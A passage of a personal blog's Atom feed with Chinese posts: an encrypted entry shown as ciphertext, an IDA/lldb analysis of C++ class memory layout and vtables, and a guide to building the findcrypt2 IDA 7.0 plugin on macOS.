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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="正则表达式" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>C++类结构以及vtable分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++类结构以及vtable分析/C++类结构以及vtable分析/</id>
    <published>2017-12-02T10:07:00.000Z</published>
    <updated>2019-03-01T02:51:19.937Z</updated>
    
    <content type="html"><![CDATA[<h3 id="C-类结构以及vtable分析"><a href="#C-类结构以及vtable分析" class="headerlink" title="C++类结构以及vtable分析"></a>C++类结构以及vtable分析</h3><blockquote><p>通过实验自己对一些C++数据结构的理解</p></blockquote><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {   public:      void setWidth(int w)      {         width = w;      }      void setHeight(int h)      {         height = h;      }   protected:      int width;      int height;};// 派生类class Rectangle: public Shape{   public:      int getArea()      {          return (width * height);       }};int main(void){   Rectangle Rect;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST08_8  unsigned int v4; // eax  char v6; // [rsp+10h] [rbp-20h]  int v7; // [rsp+1Ch] [rbp-14h]  __int64 (__fastcall *v8)(_QWORD); // [rsp+20h] [rbp-10h]  __int64 v9; // [rsp+28h] [rbp-8h]  v7 = 0;  Shape::setWidth((Shape *)&amp;v6, 5);  Shape::setHeight((Shape *)&amp;v6, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v6);  v9 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v8 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v9);  return 0;}</code></pre><p>Rect内存布局</p><pre><code>(lldb) x/20b $rbp-0x200x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x000x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</code></pre><p>能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  void *v3; // ST10_8  __int64 v4; // ST08_8  unsigned int v5; // eax  __int64 v6; // ST38_8  v3 = (void *)operator new(8uLL);  memset(v3, 0, 8uLL);  Shape::setWidth((Shape *)v3, 5);  Shape::setHeight((Shape *)v3, 7);  v4 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v5 = Rectangle::getArea((Rectangle *)v3);  v6 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, v5);  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v6);  return 0;}</code></pre><p>这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。</p><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {public:   // 提供接口框架的纯虚函数   virtual int getArea() = 0;   void setWidth(int w)   {      width = w;   }   void setHeight(int h)   {      height = h;   }protected:   int width;   int height;};// 派生类class Rectangle: public Shape{public:   int getArea()   {       return (width * height);    }};class Triangle: public Shape{public:   int getArea()   {       return (width * height)/2;    }};int main(void){   Rectangle Rect;   Triangle  Tri;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Rectangle area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   Tri.setWidth(5);   Tri.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Triangle area: &quot; &lt;&lt; Tri.getArea() &lt;&lt; endl;    return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST20_8  unsigned int v4; // eax  __int64 v5; // ST10_8  unsigned int v6; // eax  char v8; // [rsp+28h] [rbp-48h]  char v9; // [rsp+38h] [rbp-38h]  int v10; // [rsp+4Ch] [rbp-24h]  __int64 (__fastcall *v11)(_QWORD); // [rsp+50h] [rbp-20h]  __int64 v12; // [rsp+58h] [rbp-18h]  __int64 (__fastcall *v13)(_QWORD); // [rsp+60h] [rbp-10h]  __int64 v14; // [rsp+68h] [rbp-8h]  v10 = 0;  Rectangle::Rectangle((Rectangle *)&amp;v9);  Triangle::Triangle((Triangle *)&amp;v8);  Shape::setWidth((Shape *)&amp;v9, 5);  Shape::setHeight((Shape *)&amp;v9, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Rectangle area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v9);  v12 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v11 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v12);  Shape::setWidth((Shape *)&amp;v8, 5);  Shape::setHeight((Shape *)&amp;v8, 7);  v5 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Triangle area: &quot;);  v6 = Triangle::getArea((Triangle *)&amp;v8);  v14 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, v6);  v13 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v14);  return 0;}</code></pre><p>这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Rectangle::Rectangle(Rectangle *this){  __int64 *result; // rax  Shape::Shape(this);  result = &amp;`vtable for&#39;Rectangle + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Rectangle + 2;  return result;}</code></pre><p>这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Shape::Shape(Shape *this){  __int64 *result; // rax  result = &amp;`vtable for&#39;Shape + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Shape + 2;  return result;}</code></pre><p>其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。</p><p>这里的虚函数表地址，本质就是_DATA段的一个数据结构。</p><p>Rect的内存布局为</p><pre><code>(lldb) x/20b $rbp-0x380x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x000x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00</code></pre><p>这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height</p><p>去ida中查看该地址</p><pre><code class="c++">__data:0000000100002110 ; `vtable for&#39;Rectangle__data:0000000100002110 __ZTV9Rectangle dq 0                    ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o__data:0000000100002110                                         ; offset to this__data:0000000100002118                 dq offset __ZTI9Rectangle ; `typeinfo for&#39;Rectangle__data:0000000100002120                 dq offset __ZN9Rectangle7getAreaEv ; Rectangle::getArea(void)</code></pre><p>就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。</p><h3 id="一点理解"><a href="#一点理解" class="headerlink" title="一点理解"></a>一点理解</h3><p>C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;C-类结构以及vtable分析&quot;&gt;&lt;a href=&quot;#C-类结构以及vtable分析&quot; class=&quot;headerlink&quot; title=&quot;C++类结构以及vtable分析&quot;&gt;&lt;/a&gt;C++类结构以及vtable分析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;通过实
      
    
    </summary>
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/C/"/>
    
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>IDA7.0 Mac 插件编译指南v1</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-插件编写指南/IDA-Mac-插件编写指南/</id>
    <published>2017-11-30T06:25:09.000Z</published>
    <updated>2019-02-21T09:59:22.403Z</updated>
    
    <content type="html"><![CDATA[<h3 id="先说两句"><a href="#先说两句" class="headerlink" title="先说两句"></a>先说两句</h3><p>前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因此插件同样为64位的dylib。不仅这样，SDK上某些接口也发生了改变，导致很多优秀的插件不得不重新改动源码，很多在IDA7上编译也存在问题。下面我将以IDA的官方插件findcrypt2来说明IDA7的插件编译细节。编译IDA插件是个麻烦事，主要在于网上相关的资料很少，唯一的几篇也是年代久远，Makefile里面很多编译参数都有变化，目前来说，没有一个完整的文章来介绍如何在Mac平台下编译IDA插件的指南。希望这边文章能够对有这需求的人有所帮助。</p><h3 id="搭建xcode环境"><a href="#搭建xcode环境" class="headerlink" title="搭建xcode环境"></a>搭建xcode环境</h3><p>在Mac上完全可以用xcode来帮助我们编译IDA插件，其实更常见的是用Makefile编译，但原理一样，所以这里就以xcode来介绍。</p><p>我们知道IDA的插件的文件格式为dylib动态库，因此在创建xcode项目时在Framework&amp;Libarry中选择Libarry</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_1.jpg?raw=true" alt="xcode_step_1"></p><p>然后再选择为Dynamic动态库，并导入C++标准库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_2.jpg?raw=true" alt="xcode_step_2"></p><p>接下来项目中自动会生成两个文件。暂时不用管，我们把findcrypt2的源码放入该项目，最后如下图所示</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/project_1.jpg?raw=true" alt="project_1"></p><p>这时你的项目中像ida.hpp这类的头文件肯定会提示找不到，还需要进一步设置。</p><h3 id="Build-setting"><a href="#Build-setting" class="headerlink" title="Build setting"></a>Build setting</h3><p>这里我们将设置头文件和库的搜索路径等等。</p><p>首先设置目标架构为x86_64</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/arch_s.jpg?raw=true" alt="arch_s"></p><p>然后设置头文件和库的搜索路径，依据你IDA及sdk路径改成对应路径</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/search_s.jpg?raw=true" alt="search_s"></p><p>经过上面的设置，此时xcode应该能找到头文件了，这时还需要设置连接的静态库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/link_s.jpg?raw=true" alt="link_s"></p><p>这里连接的库为-lida64，表示我们编译的是解析64位的插件，若要编译解析32位的插件，这里为-lida即可。</p><p>最后我们还需要设置编译参数</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/macros_s.jpg?raw=true" alt="macros_s"></p><p>其中<code>__EA64__</code>在编译64位插件时才有。</p><p>这时候build一下，如果一切顺利，应该就不会报错了。</p><h3 id="最后说两句"><a href="#最后说两句" class="headerlink" title="最后说两句"></a>最后说两句</h3><p>IDA7相以前版本而言，插件的后缀名统一为dylib格式，之前32位为pmc，64位为pmc64。这里将编译好的插件改为<strong>findcrypt264.dylib</strong>表示为64位插件，则对应的32位插件名为<strong>findcry.dylib</strong></p><p>下面测试下效果，我们打开IDA去解析一个含有md4加密的macho文件，运行插件测试能否识别出其中的加密算法。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/test.jpg?raw=true" alt="test"></p><p>上图我们可以看到这里成功找到一处md4加密，反汇编窗口中正是md4加密中用到的常量数组。我顺便为插件注册了<strong>Ctrl-Alt-z</strong>的快捷键，若没有快捷键，可以在插件的导航栏里点击对应的插件即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>附上该插件，完。</p><p><a href="https://raw.githubusercontent.com/4ch12dy/4ch12dy.github.io/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/findcrypt264.dylib" target="_blank" rel="external">findcrypt264.dylib_for_ida7_made_by_x1a0</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><p><a href="http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html" target="_blank" rel="external">http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html</a></p></li><li><p><a href="http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/" target="_blank" rel="external">http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/</a></p></li><li><p><a href="https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile">https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile</a></p><p>​</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;先说两句&quot;&gt;&lt;a href=&quot;#先说两句&quot; class=&quot;headerlink&quot; title=&quot;先说两句&quot;&gt;&lt;/a&gt;先说两句&lt;/h3&gt;&lt;p&gt;前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因
      
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
      <category term="ida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ida/"/>
    
  </entry>
  
</feed>
